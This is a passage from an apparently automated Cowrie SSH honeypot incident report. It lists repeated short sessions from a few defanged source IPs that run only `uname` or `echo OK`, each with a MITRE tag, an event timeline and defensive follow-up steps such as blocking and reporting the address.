- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24ece3d8d7e3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:59 |
| **Last Seen** | 2026-06-27 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:59:07` | `cowrie.session.connect` |
| `2026-06-27 09:59:07` | `cowrie.client.version` |
| `2026-06-27 09:59:08` | `cowrie.client.kex` |
| `2026-06-27 09:59:08` | `cowrie.login.success` |
| `2026-06-27 09:59:09` | `cowrie.session.params` |
| `2026-06-27 09:59:09` | `cowrie.command.input` |
| `2026-06-27 09:59:09` | `cowrie.log.closed` |
| `2026-06-27 09:59:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e03cd7ffc93

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:00 |
| **Last Seen** | 2026-06-27 10:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:00:18` | `cowrie.session.connect` |
| `2026-06-27 10:00:18` | `cowrie.client.version` |
| `2026-06-27 10:00:18` | `cowrie.client.kex` |
| `2026-06-27 10:00:18` | `cowrie.login.success` |
| `2026-06-27 10:00:19` | `cowrie.session.params` |
| `2026-06-27 10:00:19` | `cowrie.command.input` |
| `2026-06-27 10:00:19` | `cowrie.log.closed` |
| `2026-06-27 10:00:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a08fa125dc1

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:01 |
| **Last Seen** | 2026-06-27 10:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:01:03` | `cowrie.session.connect` |
| `2026-06-27 10:01:03` | `cowrie.client.version` |
| `2026-06-27 10:01:03` | `cowrie.client.kex` |
| `2026-06-27 10:01:04` | `cowrie.login.success` |
| `2026-06-27 10:01:04` | `cowrie.session.params` |
| `2026-06-27 10:01:04` | `cowrie.command.input` |
| `2026-06-27 10:01:04` | `cowrie.log.closed` |
| `2026-06-27 10:01:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02565737277a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:01 |
| **Last Seen** | 2026-06-27 10:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:01:53` | `cowrie.session.connect` |
| `2026-06-27 10:01:53` | `cowrie.client.version` |
| `2026-06-27 10:01:53` | `cowrie.client.kex` |
| `2026-06-27 10:01:53` | `cowrie.login.success` |
| `2026-06-27 10:01:54` | `cowrie.session.params` |
| `2026-06-27 10:01:54` | `cowrie.command.input` |
| `2026-06-27 10:01:54` | `cowrie.log.closed` |
| `2026-06-27 10:01:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e814dc3960b1

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:02 |
| **Last Seen** | 2026-06-27 10:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:02:38` | `cowrie.session.connect` |
| `2026-06-27 10:02:38` | `cowrie.client.version` |
| `2026-06-27 10:02:39` | `cowrie.client.kex` |
| `2026-06-27 10:02:39` | `cowrie.login.success` |
| `2026-06-27 10:02:39` | `cowrie.session.params` |
| `2026-06-27 10:02:39` | `cowrie.command.input` |
| `2026-06-27 10:02:40` | `cowrie.log.closed` |
| `2026-06-27 10:02:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47e8d3ef2071

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:03 |
| **Last Seen** | 2026-06-27 10:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:03:23` | `cowrie.session.connect` |
| `2026-06-27 10:03:23` | `cowrie.client.version` |
| `2026-06-27 10:03:23` | `cowrie.client.kex` |
| `2026-06-27 10:03:23` | `cowrie.login.success` |
| `2026-06-27 10:03:24` | `cowrie.session.params` |
| `2026-06-27 10:03:24` | `cowrie.command.input` |
| `2026-06-27 10:03:24` | `cowrie.log.closed` |
| `2026-06-27 10:03:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07e43a58d7fa

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-27 10:03 |
| **Last Seen** | 2026-06-27 10:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:03:57` | `cowrie.session.connect` |
| `2026-06-27 10:03:57` | `cowrie.client.version` |
| `2026-06-27 10:03:57` | `cowrie.client.kex` |
| `2026-06-27 10:03:59` | `cowrie.login.success` |
| `2026-06-27 10:04:00` | `cowrie.session.params` |
| `2026-06-27 10:04:00` | `cowrie.command.input` |
| `2026-06-27 10:04:01` | `cowrie.log.closed` |
| `2026-06-27 10:04:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b13dc4e58538

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:04 |
| **Last Seen** | 2026-06-27 10:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:04:07` | `cowrie.session.connect` |
| `2026-06-27 10:04:07` | `cowrie.client.version` |
| `2026-06-27 10:04:07` | `cowrie.client.kex` |
| `2026-06-27 10:04:07` | `cowrie.login.success` |
| `2026-06-27 10:04:08` | `cowrie.session.params` |
| `2026-06-27 10:04:08` | `cowrie.command.input` |
| `2026-06-27 10:04:08` | `cowrie.log.closed` |
| `2026-06-27 10:04:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c07d035b616

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:04 |
| **Last Seen** | 2026-06-27 10:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:04:52` | `cowrie.session.connect` |
| `2026-06-27 10:04:52` | `cowrie.client.version` |
| `2026-06-27 10:04:52` | `cowrie.client.kex` |
| `2026-06-27 10:04:52` | `cowrie.login.success` |
| `2026-06-27 10:04:53` | `cowrie.session.params` |
| `2026-06-27 10:04:53` | `cowrie.command.input` |
| `2026-06-27 10:04:53` | `cowrie.log.closed` |
| `2026-06-27 10:04:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-792cb206823d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:05 |
| **Last Seen** | 2026-06-27 10:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:05:38` | `cowrie.session.connect` |
| `2026-06-27 10:05:38` | `cowrie.client.version` |
| `2026-06-27 10:05:38` | `cowrie.client.kex` |
| `2026-06-27 10:05:39` | `cowrie.login.success` |
| `2026-06-27 10:05:40` | `cowrie.session.params` |
| `2026-06-27 10:05:40` | `cowrie.command.input` |
| `2026-06-27 10:05:40` | `cowrie.log.closed` |
| `2026-06-27 10:05:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79422f97ee23

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:06 |
| **Last Seen** | 2026-06-27 10:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:06:24` | `cowrie.session.connect` |
| `2026-06-27 10:06:24` | `cowrie.client.version` |
| `2026-06-27 10:06:24` | `cowrie.client.kex` |
| `2026-06-27 10:06:25` | `cowrie.login.success` |
| `2026-06-27 10:06:25` | `cowrie.session.params` |
| `2026-06-27 10:06:25` | `cowrie.command.input` |
| `2026-06-27 10:06:25` | `cowrie.log.closed` |
| `2026-06-27 10:06:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42a38291b172

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 10:07 |
| **Last Seen** | 2026-06-27 10:07 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:07:04` | `cowrie.session.connect` |
| `2026-06-27 10:07:05` | `cowrie.client.version` |
| `2026-06-27 10:07:05` | `cowrie.client.kex` |
| `2026-06-27 10:07:11` | `cowrie.login.success` |
| `2026-06-27 10:07:15` | `cowrie.session.params` |
| `2026-06-27 10:07:15` | `cowrie.command.input` |
| `2026-06-27 10:07:16` | `cowrie.log.closed` |
| `2026-06-27 10:07:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25a535ccc5bd

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:07 |
| **Last Seen** | 2026-06-27 10:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:07:10` | `cowrie.session.connect` |
| `2026-06-27 10:07:10` | `cowrie.client.version` |
| `2026-06-27 10:07:10` | `cowrie.client.kex` |
| `2026-06-27 10:07:10` | `cowrie.login.success` |
| `2026-06-27 10:07:11` | `cowrie.session.params` |
| `2026-06-27 10:07:11` | `cowrie.command.input` |
| `2026-06-27 10:07:11` | `cowrie.log.closed` |
| `2026-06-27 10:07:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d13f5f8dde7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:07 |
| **Last Seen** | 2026-06-27 10:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:07:58` | `cowrie.session.connect` |
| `2026-06-27 10:07:58` | `cowrie.client.version` |
| `2026-06-27 10:07:58` | `cowrie.client.kex` |
| `2026-06-27 10:07:59` | `cowrie.login.success` |
| `2026-06-27 10:07:59` | `cowrie.session.params` |
| `2026-06-27 10:07:59` | `cowrie.command.input` |
| `2026-06-27 10:08:00` | `cowrie.log.closed` |
| `2026-06-27 10:08:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3643d73716dc

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:08 |
| **Last Seen** | 2026-06-27 10:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:08:50` | `cowrie.session.connect` |
| `2026-06-27 10:08:50` | `cowrie.client.version` |
| `2026-06-27 10:08:50` | `cowrie.client.kex` |
| `2026-06-27 10:08:51` | `cowrie.login.success` |
| `2026-06-27 10:08:51` | `cowrie.session.params` |
| `2026-06-27 10:08:51` | `cowrie.command.input` |
| `2026-06-27 10:08:52` | `cowrie.log.closed` |
| `2026-06-27 10:08:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59b7986187ce

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:09 |
| **Last Seen** | 2026-06-27 10:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:09:37` | `cowrie.session.connect` |
| `2026-06-27 10:09:37` | `cowrie.client.version` |
| `2026-06-27 10:09:37` | `cowrie.client.kex` |
| `2026-06-27 10:09:37` | `cowrie.login.success` |
| `2026-06-27 10:09:38` | `cowrie.session.params` |
| `2026-06-27 10:09:38` | `cowrie.command.input` |
| `2026-06-27 10:09:38` | `cowrie.log.closed` |
| `2026-06-27 10:09:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75fd5ca5cd16

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:10 |
| **Last Seen** | 2026-06-27 10:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:10:25` | `cowrie.session.connect` |
| `2026-06-27 10:10:25` | `cowrie.client.version` |
| `2026-06-27 10:10:25` | `cowrie.client.kex` |
| `2026-06-27 10:10:25` | `cowrie.login.success` |
| `2026-06-27 10:10:26` | `cowrie.session.params` |
| `2026-06-27 10:10:26` | `cowrie.command.input` |
| `2026-06-27 10:10:26` | `cowrie.log.closed` |
| `2026-06-27 10:10:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-185d33de0177

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:11 |
| **Last Seen** | 2026-06-27 10:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:11:12` | `cowrie.session.connect` |
| `2026-06-27 10:11:12` | `cowrie.client.version` |
| `2026-06-27 10:11:12` | `cowrie.client.kex` |
| `2026-06-27 10:11:12` | `cowrie.login.success` |
| `2026-06-27 10:11:13` | `cowrie.session.params` |
| `2026-06-27 10:11:13` | `cowrie.command.input` |
| `2026-06-27 10:11:13` | `cowrie.log.closed` |
| `2026-06-27 10:11:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d49c45af1ef4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:12 |
| **Last Seen** | 2026-06-27 10:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:12:00` | `cowrie.session.connect` |
| `2026-06-27 10:12:00` | `cowrie.client.version` |
| `2026-06-27 10:12:00` | `cowrie.client.kex` |
| `2026-06-27 10:12:01` | `cowrie.login.success` |
| `2026-06-27 10:12:01` | `cowrie.session.params` |
| `2026-06-27 10:12:01` | `cowrie.command.input` |
| `2026-06-27 10:12:02` | `cowrie.log.closed` |
| `2026-06-27 10:12:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a80971944a9

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:12 |
| **Last Seen** | 2026-06-27 10:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:12:53` | `cowrie.session.connect` |
| `2026-06-27 10:12:53` | `cowrie.client.version` |
| `2026-06-27 10:12:53` | `cowrie.client.kex` |
| `2026-06-27 10:12:53` | `cowrie.login.success` |
| `2026-06-27 10:12:54` | `cowrie.session.params` |
| `2026-06-27 10:12:54` | `cowrie.command.input` |
| `2026-06-27 10:12:54` | `cowrie.log.closed` |
| `2026-06-27 10:12:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b580cf60d380

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:13 |
| **Last Seen** | 2026-06-27 10:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:13:49` | `cowrie.session.connect` |
| `2026-06-27 10:13:49` | `cowrie.client.version` |
| `2026-06-27 10:13:49` | `cowrie.client.kex` |
| `2026-06-27 10:13:50` | `cowrie.login.success` |
| `2026-06-27 10:13:50` | `cowrie.session.params` |
| `2026-06-27 10:13:50` | `cowrie.command.input` |
| `2026-06-27 10:13:51` | `cowrie.log.closed` |
| `2026-06-27 10:13:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f6b087ff528

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:14 |
| **Last Seen** | 2026-06-27 10:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:14:43` | `cowrie.session.connect` |
| `2026-06-27 10:14:43` | `cowrie.client.version` |
| `2026-06-27 10:14:43` | `cowrie.client.kex` |
| `2026-06-27 10:14:43` | `cowrie.login.success` |
| `2026-06-27 10:14:44` | `cowrie.session.params` |
| `2026-06-27 10:14:44` | `cowrie.command.input` |
| `2026-06-27 10:14:44` | `cowrie.log.closed` |
| `2026-06-27 10:14:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0561f649ef16

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:15 |
| **Last Seen** | 2026-06-27 10:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:15:35` | `cowrie.session.connect` |
| `2026-06-27 10:15:35` | `cowrie.client.version` |
| `2026-06-27 10:15:35` | `cowrie.client.kex` |
| `2026-06-27 10:15:35` | `cowrie.login.success` |
| `2026-06-27 10:15:36` | `cowrie.session.params` |
| `2026-06-27 10:15:36` | `cowrie.command.input` |
| `2026-06-27 10:15:36` | `cowrie.log.closed` |
| `2026-06-27 10:15:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcb7714027e6

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:16 |
| **Last Seen** | 2026-06-27 10:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:16:24` | `cowrie.session.connect` |
| `2026-06-27 10:16:24` | `cowrie.client.version` |
| `2026-06-27 10:16:24` | `cowrie.client.kex` |
| `2026-06-27 10:16:24` | `cowrie.login.success` |
| `2026-06-27 10:16:25` | `cowrie.session.params` |
| `2026-06-27 10:16:25` | `cowrie.command.input` |
| `2026-06-27 10:16:25` | `cowrie.log.closed` |
| `2026-06-27 10:16:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efb3df80144d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:17 |
| **Last Seen** | 2026-06-27 10:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:17:10` | `cowrie.session.connect` |
| `2026-06-27 10:17:10` | `cowrie.client.version` |
| `2026-06-27 10:17:10` | `cowrie.client.kex` |
| `2026-06-27 10:17:11` | `cowrie.login.success` |
| `2026-06-27 10:17:11` | `cowrie.session.params` |
| `2026-06-27 10:17:11` | `cowrie.command.input` |
| `2026-06-27 10:17:11` | `cowrie.log.closed` |
| `2026-06-27 10:17:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-029eee37aefa

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 10:17 |
| **Last Seen** | 2026-06-27 10:18 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:17:52` | `cowrie.session.connect` |
| `2026-06-27 10:17:53` | `cowrie.client.version` |
| `2026-06-27 10:17:53` | `cowrie.client.kex` |
| `2026-06-27 10:17:59` | `cowrie.login.success` |
| `2026-06-27 10:18:02` | `cowrie.session.params` |
